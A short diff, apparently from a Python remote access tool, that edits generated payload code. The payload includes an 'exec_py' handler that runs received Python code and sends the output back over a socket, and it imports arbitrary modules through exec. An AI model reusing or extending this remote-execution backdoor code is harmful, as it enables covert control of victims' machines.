@@ -21,7 +21,7 @@ def main(option):
                     exec ('import ' + module_to_load)
                     print(config.pos + 'Valid module, loaded on')
                     config.import_statements.append('import ' + module_to_load)
-                except ImportError:
+                except (ImportError, SyntaxError):
                     print(config.neg + 'Invalid module, not loaded on')
             except EOFError:
                 try:
@@ -44,7 +44,7 @@ def exec_py(command):
         result.write(str(e) + '\\n')
     sys.stdout = old_stdout
     result_string = result.getvalue()
-    s.sendall(('[*]Result of code : \\n\\n' + result_string).encode())
+    send_all(s,'[*]Result of code : \\n\\n' + result_string)
 ''')
         config.logics.append('''
             elif command == "exec_py":
